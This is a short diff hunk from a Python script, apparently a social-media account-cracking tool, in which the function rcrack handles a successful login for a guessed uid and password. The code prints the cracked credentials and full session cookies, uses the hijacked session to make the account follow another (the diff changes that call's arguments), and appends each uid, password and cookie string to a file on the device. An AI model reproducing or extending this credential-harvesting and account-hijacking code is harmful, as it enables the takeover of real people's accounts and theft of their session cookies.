@@ -302,7 +302,7 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃COOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')  
-                follow(self, session, coki)
+                follow(self,coki)
                 cek_apk(session,coki)
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
